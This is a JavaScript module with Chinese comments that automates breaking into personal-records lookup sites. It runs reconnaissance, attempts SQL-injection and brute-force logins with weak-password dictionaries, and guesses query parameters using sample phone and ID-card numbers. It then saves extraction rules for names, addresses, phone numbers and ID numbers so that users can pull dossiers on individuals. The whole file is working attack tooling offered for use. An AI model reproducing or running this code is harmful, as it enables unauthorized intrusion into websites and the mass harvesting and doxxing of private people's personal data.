'use strict';

/**
 * 一步式接入一个查档站：
 *   给一个网址 → 自动侦察 → 自动破登录 → 自动找出查询接口
 *   → 自动试出该站用哪个参数名（keyword? phone? idcard?）
 *   → 自动定抽取规则 → 存为 enabled 数据源
 *
 * 之后用户在主界面只输手机号/身份证就能出档案，不用再碰任何面板。
 */

const config = require('./config');
const recon = require('./recon');
const breach = require('./breach');
const dict = require('./dict');

const UA = (config.userAgent) || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';

// 候选参数名：国内查档站常见叫法
const PARAM_CANDIDATES = [
  'keyword', 'key', 'kw', 'q', 'query', 'search', 'wd', 'content',
  'phone', 'mobile', 'tel', 'phoneNum', 'phone_number', 'shouji', 'sj',
  'idcard', 'id_card', 'idCard', 'sfz', 'idno', 'idNo', 'card', 'cardno',
  'name', 'username', 'value', 'data', 'input', 'text',
];

// 参数值候选：同时试手机号与身份证，看站点认哪个
const SAMPLE_VALUES = {
  phone: ['13800138000', '13912345678'],
  idcard: ['440524199001011234', '11010119900307123X'],
};

// 命中特征：回应里出现这些，说明真的查到人了
const FEATURE_RE = [
  /姓名|名字|真实姓名/,
  /住址|地址|户籍|详细地址|收货|快递/,
  /身份证号?|证件号/,
  /手机号?|电话|联系方式/,
  /[一六粤京沪浙苏鲁豫川鄂湘粤冀晋辽吉黑皖闽赣渝滇陕甘青琼新藏桂蒙宁津港澳]/,
];

const BASELINE = 'zzqq__invalid__' + Math.random().toString(36).slice(2, 8);

function esc(s) {
  return String(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function score(text) {
  const t = String(text || '');
  let n = 0;
  FEATURE_RE.forEach((re) => { if (re.test(t)) n++; });
  return n;
}

// 从成功样本里自动推抽取规则
function deriveExtract(text) {
  const rules = {};
  const t = String(text || '');
  // 优先按 JSON 解析，找中文键
  let obj = null;
  try { obj = JSON.parse(t); } catch (e) { /* 不是 JSON */ }
  if (obj && typeof obj === 'object') {
    const found = {};
    const walk = (node, path) => {
      if (node == null || typeof node !== 'object') return;
      for (const [k, v] of Object.entries(node)) {
        const p = path ? path + '.' + k : k;
        if (v && typeof v === 'object' && !Array.isArray(v)) { walk(v, p); continue; }
        const key = String(k);
        if (/姓名|名字|real_?name|^name$/i.test(key)) found['姓名'] = found['姓名'] || p;
        else if (/住址|地址|户籍|收货|快递|addr/i.test(key)) found['住址'] = found['住址'] || p;
        else if (/手机|电话|联系方式|^phone$|^mobile$|^tel$/i.test(key)) found['手机'] = found['手机'] || p;
        else if (/身份证|证件号|idcard|id_card|idno/i.test(key)) found['身份证号'] = found['身份证号'] || p;
      }
    };
    walk(obj, '');
    Object.entries(found).forEach(([std, p]) => { rules[std] = 'json:' + p; });
    if (Object.keys(rules).length) {
      // JSON 型接口：把常见别名也补上，防止目标站改字段名
      if (!rules['姓名']) rules['姓名'] = 'json:data.name';
      return { rules, format: 'json' };
    }
  }
  // 非 JSON：退回正则，按"标签: 值"抓
  rules['姓名'] = 'regex:姓名[:：]\\s*([^\\s\\n<,，]+)';
  rules['住址'] = 'regex:(?:住址|户籍地址?|详细地址|收货地址|快递地址|地址)[:：]\\s*([^\\n<]+)';
  rules['手机'] = 'regex:(?:手机号?|电话|联系方式)[:：]\\s*([0-9]{7,15})';
  rules['身份证号'] = 'regex:(?:身份证号?|证件号)[:：]\\s*([0-9Xx]{15,18})';
  return { rules, format: 'text' };
}

async function tryCall(url, method, cookie, paramName, value, timeout) {
  return breach.directCall({
    url,
    method: method || 'POST',
    timeout: timeout || 12000,
    headers: Object.assign(
      { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, Accept: '*/*' },
      cookie ? { Cookie: cookie } : {}
    ),
    body: paramName + '=' + encodeURIComponent(value),
  });
}

/**
 * 试出某个接口用哪个参数名、认哪种输入
 */
async function discoverParam(url, cookie, opts, log) {
  const samples = opts.samples || SAMPLE_VALUES;
  const names = (opts.paramNames && opts.paramNames.length) ? opts.paramNames : PARAM_CANDIDATES;
  const best = { param: null, kind: null, score: 0, body: '', status: 0 };

  // 基线：无论哪个参数名，先发一个明显的垃圾值
  const baseRes = await tryCall(url, 'POST', cookie, names[0], BASELINE, opts.timeout);
  const baseText = String(baseRes.body || '');
  const baseLen = baseText.length;
  const baseScore = score(baseText);

  for (const kind of Object.keys(samples)) {
    for (const val of samples[kind]) {
      for (const p of names) {
        let r;
        try {
          r = await tryCall(url, 'POST', cookie, p, val, opts.timeout);
        } catch (e) {
          continue;
        }
        if (!r || r.status !== 200) continue;
        const t = String(r.body || '');
        if (!t) continue;
        const s = score(t);
        const differ = t !== baseText && !(baseLen > 0 && Math.abs(t.length - baseLen) < 8 && s === baseScore);
        if (!differ && s === 0) continue;
        // 打分：特征命中数为主，长度差异为辅
        const total = s * 10 + (differ ? 3 : 0);
        if (total > best.score) {
          best.score = total;
          best.param = p;
          best.kind = kind;
          best.body = t;
          best.status = r.status;
          best.sample = val;
        }
      }
      if (best.score >= 20) break; // 已经很明确了，不用再试
    }
    if (best.score >= 20) break;
  }
  log && log('参数探测', best.param ? ('认参数 ' + best.param + '（' + best.kind + '，特征命中 ' + best.score + '）') : '没试出有效参数');
  return best;
}

/**
 * 主流程
 */
async function connect(opts, log) {
  const o = opts || {};
  const noop = function () {};
  log = log || noop;
  const base = recon.normalizeUrl(o.url || o.baseUrl);
  if (!base) throw new Error('缺少 url');

  const out = { url: base, steps: [], logins: [], apis: [], target: null, warning: null };

  // ① 侦察
  log('侦察', base);
  let rc;
  try {
    rc = await recon.recon(base, { subdomains: o.subdomains !== false, concurrency: 10 });
  } catch (e) {
    throw new Error('侦察失败：' + e.message + '（该站可能需要代理才能访问）');
  }
  out.fingerprints = rc.fingerprints || [];
  out.loginUrls = (rc.paths || []).filter((p) => /登录页/.test(p.note || '')).map((p) => p.url);
  out.leaks = (rc.paths || []).filter((p) => /★/.test(p.note || '')).map((p) => ({ url: p.url, note: p.note }));
  out.botTokens = rc.botTokens || [];
  log('侦察', '指纹=' + ((rc.fingerprints || []).join(',') || '无') +
    ' 登录页=' + out.loginUrls.length + ' 泄露=' + out.leaks.length);

  // ② 破登录
  let cookie = String(o.cookie || '').trim();
  if (!cookie && out.loginUrls.length && o.doBreach !== false) {
    const usernames = (o.usernames && o.usernames.length) ? o.usernames : dict.COMMON_USERS;
    const passwords = (o.passwords && o.passwords.length) ? o.passwords : dict.WEAK_PASSWORDS.slice(0, 30);
    for (const url of out.loginUrls.slice(0, 2)) {
      log('破登录', url);
      try {
        const sq = await breach.sqliLogin({ url, usernames, payloads: dict.SQLI_PAYLOADS.slice(0, 8) });
        (sq.candidates || []).forEach((c) => out.logins.push(Object.assign({ url, via: 'sqli' }, c)));
      } catch (e) { /* ignore */ }
      try {
        const br = await breach.bruteLogin({ url, usernames, passwords, stopOnFirst: true });
        (br.candidates || []).forEach((c) => out.logins.push(Object.assign({ url, via: 'brute' }, c)));
      } catch (e) { /* ignore */ }
      const hit = out.logins.find((l) => l.cookie);
      if (hit) { cookie = hit.cookie; log('破登录', '拿到会话：' + hit.username + '/' + hit.password); break; }
    }
    if (!cookie) log('破登录', '没破开，尝试免登录直查', 'warn');
  }
  out.cookie = cookie;

  // ③ 找候选查询接口
  const candidates = [...new Set([].concat(
    o.apis || [],
    dict.QUERY_API_PATHS,
    (out.leaks || []).map((l) => { try { return new URL(l.url).pathname; } catch (e) { return null; } }).filter(Boolean)
  ))].slice(0, 40);

  log('找接口', '候选 ' + candidates.length + ' 条路径');

  // ④ 逐个接口试参数名
  for (const p of candidates) {
    const url = base + p;
    let probeRes;
    try {
      probeRes = await tryCall(url, 'POST', cookie, 'keyword', BASELINE, 8000);
    } catch (e) {
      continue;
    }
    if (!probeRes || probeRes.status === 404) continue;
    const d = await discoverParam(url, cookie, o, log);
    // 至少要命中 1 条特征（score>=10）才算有效接口，否则只是"能返回 200"的空壳
    if (!d.param || d.score < 10) continue;
    out.apis.push({
      path: p, url, param: d.param, kind: d.kind, score: d.score, status: d.status,
      preview: String(d.body || '').slice(0, 300),
      sample: String(d.body || ''),
    });
    if (d.score >= 20) break; // 够用了
  }

  out.apis.sort((a, b) => b.score - a.score);
  const win = out.apis[0];
  if (!win) {
    out.warning = '没找到可用的查询接口。可能原因：该站需要登录而没破开、接口路径不在字典里、或需要代理。可在「高级 → 手动攻破」里指定接口地址。';
    log('结果', out.warning, 'warn');
    return out;
  }

  // ⑤ 定抽取规则并落成数据源（用完整响应，别用截断的 preview，否则 JSON 解析会失败退回正则）
  const { rules, format } = deriveExtract(win.sample || win.preview);
  const target = {
    name: o.name || ('查档站-' + (function () { try { return new URL(base).hostname; } catch (e) { return 'unknown'; } })()),
    enabled: true,
    type: win.kind || 'any',
    method: 'POST',
    url: win.url,
    headers: Object.assign(
      { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA },
      cookie ? { Cookie: cookie } : {},
      o.headers || {}
    ),
    body: win.param + '={input}',
    extract: rules,
    timeout: 20000,
  };

  config.targets = (config.targets || []).filter((t) => !t || t.url !== target.url);
  config.targets.push(target);
  if (config.__save) config.__save();

  out.target = target;
  out.format = format;
  log('结果', '已接入：' + target.name + '（' + win.param + '={input}，' + format + '）');
  return out;
}

module.exports = { connect, discoverParam, deriveExtract, PARAM_CANDIDATES, SAMPLE_VALUES };
